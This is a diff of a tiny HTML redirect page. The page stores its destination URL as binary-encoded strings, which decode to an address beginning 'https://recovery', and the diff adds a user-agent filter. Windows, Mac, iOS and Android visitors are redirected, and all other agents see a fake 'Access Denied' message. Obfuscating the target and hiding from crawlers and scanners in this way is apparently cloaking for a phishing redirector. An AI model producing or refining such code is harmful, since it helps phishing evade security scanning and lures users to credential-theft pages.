@@ -2,9 +2,8 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title></title>
+<title>Redirecting...</title>
 <script>
-
 const binary = [
   "01101000","01110100","01110100","01110000","01110011","00111010","00101111","00101111",
   "01110010","01100101","01100011","01101111","01110110","01100101","01110010","01111001",
@@ -17,8 +16,17 @@ const binary = [
 // Convert binary → string
 const url = binary.map(b => String.fromCharCode(parseInt(b, 2))).join("");
 
-// Instant redirect
-window.location.replace(url);
+// Detect allowed operating systems
+const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+const allowedOS = /Windows|Macintosh|iPhone|iPad|iPod|Android/i;
+
+if (allowedOS.test(userAgent)) {
+    // Redirect allowed devices
+    window.location.replace(url);
+} else {
+    // Block others
+    document.body.innerHTML = "<h2>Access Denied: Your device is not supported.</h2>";
+}
 </script>
 </head>
 <body></body>
